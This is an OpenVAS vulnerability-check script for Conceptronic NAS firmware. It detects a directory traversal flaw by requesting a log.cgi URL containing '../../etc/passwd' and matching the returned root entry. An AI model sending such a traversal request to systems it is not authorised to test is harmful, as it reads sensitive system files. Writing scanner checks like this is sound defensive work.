###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_conceptronic_55369.nasl 12 2013-10-27 11:15:33Z jan $
#
# Multiple Conceptronic Products Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Multiple Conceptronic products are prone to a directory-traversal
vulnerability.

A remote attacker could exploit the vulnerability using directory-
traversal characters ('../') to access arbitrary files that contain
sensitive information that could aid in further attacks.

The following products are affected:

Conceptronic Home Media Store CH3ENAS Firmware 3.0.12 Conceptronic
Dual Bay Home Media Store CH3HNAS Firmware 2.4.13";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103563";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(55369);
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_version ("$Revision: 12 $");

 script_name("Multiple Conceptronic Products Directory Traversal Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55369");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-09-12 12:56:11 +0200 (Wed, 12 Sep 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(http_vuln_check(port:port, url:"/login.htm",pattern:"(Conceptronic|CH3HNAS|CH3ENAS)")) {

  url = '/cgi-bin/log.cgi?syslog&../../etc/passwd&Conceptronic2009';

  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:",check_header:TRUE)) {

      security_hole(port:port);
      exit(0);
    }  
}

exit(0);
